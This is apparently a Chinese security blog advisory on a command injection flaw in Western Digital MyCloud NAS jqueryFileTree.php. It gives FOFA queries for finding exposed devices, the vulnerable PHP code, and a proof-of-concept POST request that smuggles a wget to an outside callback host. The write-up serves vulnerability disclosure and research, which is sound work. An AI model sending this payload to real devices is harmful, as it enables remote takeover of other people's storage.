---
title: "西部数码 NAS jqueryFileTree.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-jqueryFileTree-rce.html
asset_dir: assets/西部数码-nas-jqueryfiletree.php-命令执行漏洞
---

# 西部数码 NAS jqueryFileTree.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/12 10:13
* 668浏览
* [0评论](#comment)
* 18分钟阅读

深入探索

物流软件安全

JSON处理工具

网络安全培训


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS jqueryFileTree.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞预警服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

深入探索

软件

VPN服务

身份验证

直接看 `jqueryFileTree.php` 其业务实现逻辑如下

```
<?php
//
// jQuery File Tree PHP Connector
//
// Version 1.01
//
// Cory S.N. LaViska
// A Beautiful Site (http://abeautifulsite.net/)
// 24 March 2008
//
// History:
//
// 1.01 - updated to work with foreign characters in directory/file names (12 April 2008)
// 1.00 - released (24 March 2008)
//
// Output a list of files for jQuery File Tree
//
//$dir = $_POST['dir'];
//$host = $_POST['host'];
//$pwd = $_POST['pwd'];
//$user = $_POST['user'];

$host = ($_POST['host'] == "")? $_GET['host']:$_POST['host'];
$pwd = ($_POST['pwd'] == "")? $_GET['pwd']:$_POST['pwd'];
$user = ($_POST['user'] == "")? $_GET['user']:$_POST['user'];
$dir = ($_POST['dir'] == "")? $_GET['dir']:$_POST['dir'];
$lang = ($_POST['lang'] == "")? $_GET['lang']:$_POST['lang'];
//echo $dir."dir1=".dir1;
error_reporting(0);

       @unlink("/tmp/ftp-folder.txt");
       @unlink("/tmp/ftp-file.txt");

       $cmd = sprintf("ftp_download -c gettree -i \"%s\" -u \"%s\" -p \"%s\" -t \"%s\" -l \"%s\"", $host, $user, $pwd ,$dir ,$lang);

       $handle = popen($cmd, 'r');
```

深入探索

企业安全咨询

Windows安全工具

服务器安全服务

多个参数如`host`、`pwd`、`user`、`dir`、`lang`均未过滤或校验，被直接使用`sprintf`格式化拼接后使用`popen`进行[执行命令](https://mrxn.net/tag/rce)，造成[命令注入漏洞](https://mrxn.net/tag/rce)。

# 漏洞复现

```
POST /web/addons/jqueryFileTree.php HTTP/1.1
Host: west.nas.mrxn.net
Content-Type: application/x-www-form-urlencoded

host=";wget dnslog.pt;"
```

[![西部数码 NAS jqueryFileTree.php 命令执行漏洞](images/img-001-4e555cc7e7f3.webp)](https://image.mrxn.net/8ca39413f297481e8ce5691a5d8e208e.webp)

在DNSLOG平台成功收到DNS和HTTP请求

漏洞预警服务

* 标签：
* [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS jqueryFileTree.php 命令执行漏洞](https://mrxn.net/jswz/west-nas-jqueryFileTree-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-jqueryFileTree-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-jqueryFileTree-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

安全工具开发

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-jqueryFileTree-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 